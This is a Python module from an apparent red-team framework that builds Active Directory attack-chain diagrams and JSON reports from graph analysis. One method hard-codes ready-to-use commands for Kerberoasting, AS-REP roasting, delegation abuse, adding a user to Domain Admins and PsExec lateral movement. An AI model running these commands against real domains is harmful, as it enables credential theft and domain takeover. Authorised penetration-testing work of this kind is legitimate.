#!/usr/bin/env python3
"""
Attack Chain Visualization Module for Blackbox Umbra
Generates Mermaid diagrams and JSON representations of exploitation chains
"""

import json
import logging
from typing import Dict, List, Tuple, Optional
from datetime import datetime
from enum import Enum

logger = logging.getLogger(__name__)


class AttackStage(Enum):
    """Stages in the attack kill chain."""
    INITIAL_ACCESS = "Initial Access"
    ENUMERATION = "Enumeration"
    LATERAL_MOVEMENT = "Lateral Movement"
    PERSISTENCE = "Persistence"
    PRIVILEGE_ESCALATION = "Privilege Escalation"
    DATA_EXFILTRATION = "Data Exfiltration"


class AttackVector:
    """Represents a single exploitation technique in an attack chain."""
    
    def __init__(self, 
                 stage: AttackStage,
                 technique: str,
                 source: str,
                 target: str,
                 tool: str,
                 severity: str = "MEDIUM",
                 description: str = "",
                 prerequisite: Optional[str] = None):
        self.stage = stage
        self.technique = technique
        self.source = source
        self.target = target
        self.tool = tool
        self.severity = severity
        self.description = description
        self.prerequisite = prerequisite
    
    def to_dict(self) -> Dict:
        return {
            "stage": self.stage.value,
            "technique": self.technique,
            "source": self.source,
            "target": self.target,
            "tool": self.tool,
            "severity": self.severity,
            "description": self.description,
            "prerequisite": self.prerequisite
        }


class AttackChain:
    """Represents a complete exploitation chain from initial access to objective."""
    
    def __init__(self, chain_id: str, objective: str, initial_access: str):
        self.chain_id = chain_id
        self.objective = objective
        self.initial_access = initial_access
        self.vectors: List[AttackVector] = []
        self.created_at = datetime.now().isoformat()
    
    def add_vector(self, vector: AttackVector) -> None:
        """Add an attack vector to the chain."""
        self.vectors.append(vector)
    
    def get_severity(self) -> str:
        """Get highest severity in chain."""
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        severities = [v.severity for v in self.vectors]
        if not severities:
            return "LOW"
        return min(severities, key=lambda x: severity_order.get(x, 4))
    
    def to_dict(self) -> Dict:
        return {
            "chain_id": self.chain_id,
            "objective": self.objective,
            "initial_access": self.initial_access,
            "severity": self.get_severity(),
            "vector_count": len(self.vectors),
            "vectors": [v.to_dict() for v in self.vectors],
            "created_at": self.created_at
        }


class AttackChainVisualizer:
    """Generates visual representations of attack chains."""
    
    def __init__(self):
        self.chains: List[AttackChain] = []
    
    def add_chain(self, chain: AttackChain) -> None:
        """Add a chain to visualization."""
        self.chains.append(chain)
    
    def generate_mermaid_diagram(self, chain: AttackChain) -> str:
        """
        Generate Mermaid flowchart for attack chain.
        
        Args:
            chain: AttackChain to visualize
        
        Returns:
            Mermaid diagram syntax
        """
        diagram = f"""graph TD
    Start["🎯 Objective: {chain.objective}"]
    Access["📍 Initial Access: {chain.initial_access}"]
    
    Start --> Access
"""
        
        prev_node = "Access"
        stage_colors = {
            AttackStage.INITIAL_ACCESS: "#FF6B6B",
            AttackStage.ENUMERATION: "#4ECDC4",
            AttackStage.LATERAL_MOVEMENT: "#45B7D1",
            AttackStage.PRIVILEGE_ESCALATION: "#F7DC6F",
            AttackStage.PERSISTENCE: "#BB8FCE",
            AttackStage.DATA_EXFILTRATION: "#85C1E2",
        }
        
        for i, vector in enumerate(chain.vectors):
            node_id = f"Step{i}"
            stage_emoji = {
                AttackStage.INITIAL_ACCESS: "📍",
                AttackStage.ENUMERATION: "🔍",
                AttackStage.LATERAL_MOVEMENT: "↔️",
                AttackStage.PRIVILEGE_ESCALATION: "⬆️",
                AttackStage.PERSISTENCE: "🔒",
                AttackStage.DATA_EXFILTRATION: "📤",
            }.get(vector.stage, "🔧")
            
            color = stage_colors.get(vector.stage, "#95A5A6")
            label = f"{stage_emoji} {vector.stage.value}<br/>{vector.technique}<br/>({vector.tool})"
            
            diagram += f"""    {node_id}["{label}", fill:{color}, stroke:#000, stroke-width:2px, color:#fff]
    {prev_node} --> {node_id}
"""
            prev_node = node_id
        
        diagram += f"""    {prev_node} --> Compromise["✅ COMPROMISED"]
"""
        
        return diagram
    
    def generate_execution_steps(self, chain: AttackChain) -> List[Dict]:
        """
        Generate step-by-step execution instructions.
        
        Args:
            chain: AttackChain to generate steps for
        
        Returns:
            List of execution steps with commands
        """
        steps = []
        
        for i, vector in enumerate(chain.vectors, 1):
            step = {
                "step": i,
                "stage": vector.stage.value,
                "technique": vector.technique,
                "source": vector.source,
                "target": vector.target,
                "tool": vector.tool,
                "description": vector.description,
                "severity": vector.severity,
                "commands": self._get_commands_for_technique(vector)
            }
            steps.append(step)
        
        return steps
    
    def _get_commands_for_technique(self, vector: AttackVector) -> List[str]:
        """Get example commands for technique."""
        command_map = {
            "Kerberoasting": [
                "# Invoke-Rubeus.ps1 kerberoast",
                r".\Rubeus.exe kerberoast /domain:DOMAIN.COM /outfile:hashes.txt",
                "hashcat -m 13100 hashes.txt wordlist.txt"
            ],
            "AS-REP Roasting": [
                "# GetNPUsers.py from impacket",
                "GetNPUsers.py DOMAIN.COM/ -usersfile users.txt -outfile asrep_hashes.txt",
                "hashcat -m 18200 asrep_hashes.txt wordlist.txt"
            ],
            "Unconstrained Delegation": [
                "# Exploit unconstrained delegation via PrinterBug",
                r".\SpoolSample.exe DC-NAME ATTACKER-NAME",
                r".\Rubeus.exe monitor /monitorinterval:5",
                r".\Rubeus.exe dump /servicekey:AES256_KEY"
            ],
            "ACL Abuse": [
                "# GenericAll/WriteProperty abuse",
                "Add-ADGroupMember -Identity 'Domain Admins' -Members attacker_user",
                "Set-ADUser -Identity target -UserPrincipalName attacker@domain.com"
            ],
            "Lateral Movement": [
                "# Use compromised credentials to move laterally",
                r"PsExec.exe \\TARGET -u DOMAIN\user -p password cmd.exe",
                "winrs -r:TARGET cmd.exe"
            ]
        }
        
        return command_map.get(vector.technique, [f"Execute: {vector.tool} against {vector.target}"])
    
    def export_chains_json(self, output_file: str) -> bool:
        """
        Export all chains to JSON.
        
        Args:
            output_file: Path to output JSON file
        
        Returns:
            True if successful
        """
        try:
            export = {
                "export_date": datetime.now().isoformat(),
                "chain_count": len(self.chains),
                "chains": [chain.to_dict() for chain in self.chains],
                "diagrams": {
                    chain.chain_id: self.generate_mermaid_diagram(chain)
                    for chain in self.chains
                }
            }
            
            with open(output_file, 'w') as f:
                json.dump(export, f, indent=2, default=str)
            
            logger.info(f"Exported {len(self.chains)} attack chains to {output_file}")
            return True
        
        except Exception as e:
            logger.error(f"Export failed: {e}")
            return False


class ChainBuilder:
    """Builds attack chains from various data sources."""
    
    @staticmethod
    def build_from_graph_paths(paths: List[Dict], domain: str) -> List[AttackChain]:
        """
        Build attack chains from Neo4j shortest path results.
        
        Args:
            paths: List of shortest paths from graph.py output
            domain: Active Directory domain name
        
        Returns:
            List of AttackChain objects
        """
        chains = []
        
        for i, path_data in enumerate(paths):
            chain_id = f"chain_{i}"
            source = path_data.get('source_user', 'UNKNOWN')
            target = path_data.get('target', 'DOMAIN_ADMIN')
            
            chain = AttackChain(
                chain_id=chain_id,
                objective=f"Compromise {target}",
                initial_access=f"Compromised: {source}"
            )
            
            # Build vectors from path nodes
            nodes = path_data.get('nodes', [])
            attack_info = path_data.get('attack_chain', [])
            
            for j, edge in enumerate(attack_info):
                if j < len(nodes) - 1:
                    stage = ChainBuilder._map_privilege_to_stage(edge.get('privilege', 'Unknown'))
                    technique = ChainBuilder._privilege_to_technique(edge.get('privilege', 'Unknown'))
                    
                    vector = AttackVector(
                        stage=stage,
                        technique=technique,
                        source=nodes[j].get('name', 'UNKNOWN'),
                        target=nodes[j + 1].get('name', 'UNKNOWN'),
                        tool=ChainBuilder._get_tool_for_technique(technique),
                        severity=path_data.get('severity', 'MEDIUM'),
                        description=f"Exploit {edge.get('privilege')} permission"
                    )
                    chain.add_vector(vector)
            
            chains.append(chain)
        
        return chains
    
    @staticmethod
    def _map_privilege_to_stage(privilege: str) -> AttackStage:
        """Map AD privilege to attack stage."""
        stage_map = {
            'MEMBER_OF': AttackStage.PRIVILEGE_ESCALATION,
            'GENERIC_ALL': AttackStage.PRIVILEGE_ESCALATION,
            'WRITES': AttackStage.LATERAL_MOVEMENT,
            'ALLOWS': AttackStage.PRIVILEGE_ESCALATION,
            'ADMIN_OF': AttackStage.PRIVILEGE_ESCALATION,
        }
        
        for key, stage in stage_map.items():
            if key in privilege.upper():
                return stage
        
        return AttackStage.ENUMERATION
    
    @staticmethod
    def _privilege_to_technique(privilege: str) -> str:
        """Map privilege to exploitation technique."""
        technique_map = {
            'GenericAll': 'ACL Abuse - GenericAll',
            'WriteProperty': 'Property Write Abuse',
            'WriteDacl': 'DACL Modification',
            'AddMember': 'Group Membership Abuse',
            'Owns': 'Ownership Abuse',
            'AllExtendedRights': 'Extended Rights Abuse',
            'HasSPN': 'Kerberoasting',
            'Unconstrained': 'Unconstrained Delegation',
            'Constrained': 'Constrained Delegation',
        }
        
        for key, technique in technique_map.items():
            if key.lower() in privilege.lower():
                return technique
        
        return 'Unknown Privilege Escalation'
    
    @staticmethod
    def _get_tool_for_technique(technique: str) -> str:
        """Get primary tool for technique."""
        tool_map = {
            'Kerberoasting': 'Rubeus.exe',
            'AS-REP': 'GetNPUsers.py',
            'ACL': 'dsacls.exe / Set-ADUser',
            'Unconstrained': 'Rubeus.exe + SpoolSample',
            'Constrained': 'Rubeus.exe S4U2Proxy',
            'Group Membership': 'Add-ADGroupMember',
        }
        
        for key, tool in tool_map.items():
            if key.lower() in technique.lower():
                return tool
        
        return 'Custom Script'


def run_chain_visualization(graph_findings: Dict, bloodhound_findings: Optional[Dict] = None, 
                           engagement_output: str = ".") -> Dict:
    """
    Main entry point for attack chain visualization.
    
    Args:
        graph_findings: Results from graph.py analysis
        bloodhound_findings: Optional results from BloodHound analysis
        engagement_output: Output directory
    
    Returns:
        Dict with visualization results
    """
    results = {
        "phase": "chain_visualization",
        "status": "completed",
        "timestamp": datetime.now().isoformat(),
        "chains": [],
        "diagrams": {},
        "notes": []
    }
    
    try:
        visualizer = AttackChainVisualizer()
        
        # Build chains from graph analysis
        attack_paths = graph_findings.get('attack_paths', [])
        if attack_paths:
            chains = ChainBuilder.build_from_graph_paths(
                attack_paths,
                graph_findings.get('domain', 'WORKGROUP')
            )
            
            for chain in chains:
                visualizer.add_chain(chain)
            
            results["notes"].append(f"Built {len(chains)} attack chains from graph analysis")
        
        # Generate diagrams
        for chain in visualizer.chains:
            diagram = visualizer.generate_mermaid_diagram(chain)
            results["diagrams"][chain.chain_id] = diagram
        
        # Export visualization
        export_path = f"{engagement_output}/attack_chains.json"
        if visualizer.export_chains_json(export_path):
            results["notes"].append(f"Attack chains exported to {export_path}")
        
        # Summary
        results["chains"] = [chain.to_dict() for chain in visualizer.chains]
        
        if visualizer.chains:
            severity_counts = {}
            for chain in visualizer.chains:
                sev = chain.get_severity()
                severity_counts[sev] = severity_counts.get(sev, 0) + 1
            
            results["severity_summary"] = severity_counts
            results["status"] = "success"
        else:
            results["status"] = "warning"
            results["notes"].append("No attack chains found to visualize")
    
    except Exception as e:
        logger.error(f"Chain visualization failed: {e}")
        results["status"] = "error"
        results["notes"].append(f"Error: {str(e)}")
    
    return results
